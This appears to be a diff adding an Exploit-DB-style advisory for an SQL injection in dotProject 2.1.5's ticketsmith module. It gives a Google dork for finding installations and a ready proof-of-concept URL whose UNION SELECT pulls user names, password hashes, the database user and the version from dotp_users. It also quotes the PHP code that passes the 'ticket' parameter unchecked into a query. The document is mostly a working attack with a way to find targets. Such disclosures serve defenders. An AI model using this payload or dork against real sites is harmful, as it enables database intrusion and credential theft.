@@ -1,0 +1,60 @@
+# Exploit Title: dotProject 2.1.5 SQL Injection Vulnerability
+# Google Dork: intitle:"dotproject"
+# Date: 2011-12-09
+# Author: sherl0ck_ <sherl0ck_[at]alligatorteam[dot]org> @AlligatorTeam
+# Software Link: http://www.dotproject.net/
+# Version: 2.1.5 (tested)
+# Tested on: Debian GNU/Linux 5.0
+
+---------------
+PoC
+---------------
+
+URL:
+http://www.site.com/dotproject/index.php?m=ticketsmith&a=view&ticket=-2union
+all select
+1,2,3,@@VERSION,5,USER(),7,8,9,10,11,12,13,DATABASE(),group_concat(user_username,0x3A,user_password,0xA),16
+from dotp_users
+
+---------------
+Vulnerable code
+---------------
+
+modules/ticketsmith/view.php
+...
+11 $ticket = dPgetParam($_GET, 'ticket', '');
+...
+219 $ticket_info = query2hash("SELECT * FROM {$dbprefix}tickets WHERE ticket
+= $ticket");
+...
+
+Functions:
+
+includes/main_functions.php
+...
+283 function dPgetParam(&$arr, $name, $def=null) {
+284   return defVal($arr[$name], $def);
+285 }
+...
+
+modules/ticketsmith/common.inc.php
+...
+ 50 /* get result in associative array */
+ 51 function query2hash ($query) {
+ 52
+ 53   $result = do_query($query);
+ 54   $row = @mysql_fetch_array($result);
+ 55   return($row);
+ 56
+ 57 }
+...
+ 22 function do_query ($query) {
+ 23   $result = @mysql_query($query);
+ 24   if (!$result) {
+ 25     fatal_error("A database query error has
+occurred!<br>".mysql_error());
+ 26   } else {
+ 27     return($result);
+ 28   }
+ 29
+ 30 }
